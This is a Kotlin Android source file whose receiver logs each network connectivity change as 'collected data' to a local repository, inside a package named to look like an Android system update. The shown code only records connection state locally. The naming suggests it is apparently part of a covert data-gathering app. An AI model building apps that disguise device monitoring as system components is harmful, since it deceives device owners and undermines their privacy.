package com.androidsystem.update.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject

@AndroidEntryPoint
class NetworkReceiver : BroadcastReceiver() {
    @Inject lateinit var repository: DataRepository

    override fun onReceive(context: Context, intent: Intent) {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetwork = cm.activeNetworkInfo
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                repository.insertCollectedData("network_change", JSONObject().apply {
                    put("connected", activeNetwork?.isConnected ?: false)
                    put("type", activeNetwork?.typeName ?: "unknown")
                    put("timestamp", System.currentTimeMillis())
                }.toString())
            } finally {
                scope.cancel()
            }
        }
    }
}
